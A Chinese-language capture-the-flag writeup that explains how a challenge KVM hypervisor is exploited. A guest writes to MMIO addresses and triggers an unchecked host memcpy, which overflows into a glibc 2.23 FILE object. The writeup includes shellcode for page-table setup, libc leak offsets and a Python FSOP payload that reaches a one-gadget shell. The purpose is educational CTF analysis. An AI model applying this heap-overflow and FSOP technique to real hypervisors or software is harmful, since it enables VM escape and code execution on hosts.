# L3akCTF 2024 Real-VM Writeup

## 题目简述

题目没有提供源码，只给出一个基于 `/dev/kvm` 的 x86-64 虚拟机程序和官方 exploit。静态分析可还原出两块 guest memory：

- GPA `0x00000`、大小 `0x10000`：普通可读写执行内存，保存用户代码和页表；
- GPA `0x16000`、大小 `0x2000`：以只读 KVM memory slot 注册，guest 对其写入时产生 `KVM_EXIT_MMIO`。

Host 把四个 MMIO 地址当成命令：

```text
0x16000 -> fopen("log.txt", "r")
0x16008 -> entry = malloc(0x20)
0x16010 -> 把 guest memory 复制到 entry
0x16018 -> fclose(file)，清理并退出
```

第三个命令存在堆溢出。Host 通过 `KVM_GET_REGS` 读取 guest RAX，把高 32 位当源偏移、低 32 位当复制长度，却没有检查目标 `entry` 只有 0x20 字节：

```c
offset = guest_rax >> 32;
length = (uint32_t)guest_rax;
memcpy(entry, guest_ram + offset, length);
```

利用目标是在 guest 中触发这组 MMIO 命令，覆盖紧邻的 glibc `FILE`，再由 `fclose` 触发 FSOP。

## 解题过程

### 1. 由 stdin 泄露计算 libc

程序启动时直接输出 `stdin` 指针：

```text
Here is your Golden Bullet Comrade : 0x...
```

题目附带 glibc 2.23，官方 exploit 使用：

```python
libc_base = stdin_leak - 0x3c48e0
one_gadget = libc_base + 0x4527a
```

偏移必须与附带的 `libc-2.23.so` 对应。

### 2. 自建页表映射 MMIO

初始 guest 运行在 64 位模式，但 MMIO GPA `0x16000` 没有位于当前方便访问的虚拟地址。shellcode 在普通 guest RAM 中建立四级页表：

```text
PML4 @ 0x2000 -> 0x3003
PDPT @ 0x3000 -> 0x4003
PD   @ 0x4000 -> 0x5003

PT[0] @ 0x5000 = 0x00003
PT[1] @ 0x5008 = 0x01003
PT[2] @ 0x5010 = 0x16003
```

然后执行：

```asm
mov rax, 0x2000
mov cr3, rax
```

这样虚拟页 `0x2000` 映射到 MMIO GPA `0x16000`，对 `0x2000`、`0x2008`、`0x2010`、`0x2018` 的写入分别触发四个 host 命令。

### 3. 控制 memcpy 的偏移和长度

shellcode 本身长度恰为 `0x85`，后面直接拼接伪造堆内容。先写 `0x2008` 分配 0x20 字节 `entry`，再写 `0x2000` 调用 `fopen`，使 glibc 2.23 的 `FILE` 分配紧随其后。

触发复制前设置：

```asm
mov rax, 0x8500000195
mov rdi, 0x2010
mov dword ptr [rdi], 0x1337
```

Host 因此执行：

```c
memcpy(entry, guest_ram + 0x85, 0x195);
```

0x195 字节从 shellcode 后的 payload 开始，越过 `entry` 覆盖下一块 `FILE` 对象。

### 4. 构造 glibc 2.23 的 `_IO_str_overflow`

覆盖数据先保持相邻堆块的元数据合法：

```python
payload  = p64(0) * 2
payload += b"A" * 0x10
payload += p64(0) + p64(0x1e1)
```

随后从 `FILE` 起始处布置：

```python
payload += p64(0x00fbad8000)
payload += p64(0) * 26
payload += p64(libc_base + 0x3c37b8 - 0x10)
payload += p64(one_gadget)
```

`FILE` 的 vtable 被故意向前错位 `0x10`，使 `fclose` 原本要调用的槽落到 `_IO_str_overflow`。在 glibc 2.23 的 `_IO_strfile` 布局中，`_IO_FILE_plus` 后紧接 `_allocate_buffer` 回调；最后一个 qword 把该回调改成 one-gadget。

最后写虚拟地址 `0x2018`，Host 执行 `fclose(file)`：

```text
fclose
-> 错位 vtable
-> _IO_str_overflow
-> attacker-controlled _allocate_buffer
-> one-gadget
```

获得 shell 后读取：

```text
L3AK{KVM_4ND_F50P_1N_0N3_CH4113N63_7H15_MU57_B3_4_Dr34M}
```

## 方法总结

- KVM 题需要同时区分 guest virtual address、guest physical address 和 host userspace address；本题通过自建页表把 MMIO GPA 映射到便于写入的 guest VA。
- 真正的越界发生在 Host：guest RAX 同时控制源偏移和长度，而目标堆块固定为 0x20。虚拟机边界没有阻止恶意 guest 破坏 VMM 自身堆。
- 利用依赖 glibc 2.23 的堆布局、`_IO_strfile` 结构和 one-gadget 条件，必须固定题目附带的动态链接器与 libc 复现。
